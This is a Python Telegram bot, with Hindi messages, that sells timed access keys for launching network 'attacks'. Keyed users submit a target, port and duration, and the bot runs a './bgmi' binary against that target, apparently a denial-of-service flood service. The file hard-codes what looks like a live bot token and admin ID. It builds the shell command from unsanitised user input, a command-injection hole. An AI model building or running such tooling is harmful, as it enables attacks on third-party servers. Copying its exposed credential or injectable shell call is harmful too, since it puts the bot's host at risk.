import telebot
import subprocess
import datetime
import os
import uuid

# Insert your Telegram bot token here
bot = telebot.TeleBot('7555897511:AAGoAFosRrkVtMq2UnaKg1sKQkRDmIB0lws')

# Admin user IDs
admin_id = ["YOUR_ADMIN_ID_HERE", "7129010361"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"
LOG_FILE = "log.txt"
KEY_FILE = "keys.txt"

# Subscription periods
subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

# Key system functions
def read_keys():
    keys = {}
    try:
        with open(KEY_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    key = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        keys[key] = expiry
                    except ValueError:
                        print(f"Error parsing date for key {key}: {expiry_str}")
    except FileNotFoundError:
        pass
    return keys

def write_keys(keys):
    with open(KEY_FILE, "w") as file:
        for key, expiry in keys.items():
            file.write(f"{key} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")

def validate_key(key):
    if key in keys:
        if datetime.datetime.now() < keys[key]:
            return True
        else:
            del keys[key]
            write_keys(keys)
    return False

# Initialize key storage
keys = read_keys()

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Initialize allowed user IDs
allowed_user_ids = read_users()

# Attack command (Unlimited Attacks Allowed)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])

            if time > 240:
                response = "⏳ टाइम लिमिट 240 सेकंड से ज्यादा नहीं हो सकती!"
            else:
                bot.reply_to(message, "🔑 अटैक अप्रूवल के लिए अपनी Key डालो:")
                bot.register_next_step_handler(message, lambda msg: validate_and_execute_attack(msg, target, port, time))
        else:
            response = "⚡ सही फॉर्मेट: `/RS <target> <port> <time>`"
    else:
        response = "❌ आपको अटैक करने की परमिशन नहीं है!"
    
    bot.reply_to(message, response)

# Validate key and execute attack (Unlimited Attacks)
def validate_and_execute_attack(message, target, port, time):
    user_id = str(message.chat.id)
    command = message.text.split()

    if len(command) > 0:
        user_key = command[0]
        if validate_key(user_key):
            bot.reply_to(message, f"🚀 अटैक शुरू हो चुका है: {target}:{port} ({time} सेकंड)!")

            full_command = f"./bgmi {target} {port} {time} 100"
            subprocess.Popen(full_command, shell=True)  # Popen से अटैक बैकग्राउंड में रन होगा

        else:
            bot.reply_to(message, "❌ गलत या एक्सपायर्ड Key!")
    else:
        bot.reply_to(message, "❌ कृपया अपनी Key डालें!")

# Polling the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)